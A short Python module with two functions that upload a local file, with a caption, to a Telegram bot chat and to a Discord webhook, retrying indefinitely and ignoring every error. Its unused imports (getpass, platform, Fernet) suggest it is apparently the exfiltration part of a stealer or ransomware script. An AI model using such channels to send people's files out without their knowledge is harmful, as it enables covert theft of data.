import requests
import time
import os
import json
import getpass
import platform
from cryptography.fernet import Fernet
from pathlib import Path



def send_data(token: str, chat_id: str, file_path: str, message: str) -> None:
    telegram_api = f"https://api.telegram.org/bot{token}/sendDocument"

    files: dict[str, bytes] = {'document' : open(file_path, 'rb')}
    data: dict[str, str] = {
            'chat_id' : chat_id,
            'caption' : message
        }
    while True:
        try:
            res = requests.post(telegram_api, data=data, files=files)
            if res.status_code != 200:
                time.sleep(2)
                continue
            break
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.RequestException, Exception):
            continue
        
def send_to_discord(webhook_url: str, file_path: str, message: str) -> None:
    discord_api = webhook_url

    files: dict[str, bytes] = {'file' : open(file_path, 'rb')}
    data: dict[str, str] = {
            'content' : message
        }
    while True:
        try:
            res = requests.post(discord_api, data=data, files=files)
            if res.status_code != 200:
                time.sleep(2)
                continue
            break
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.RequestException, Exception):
            continue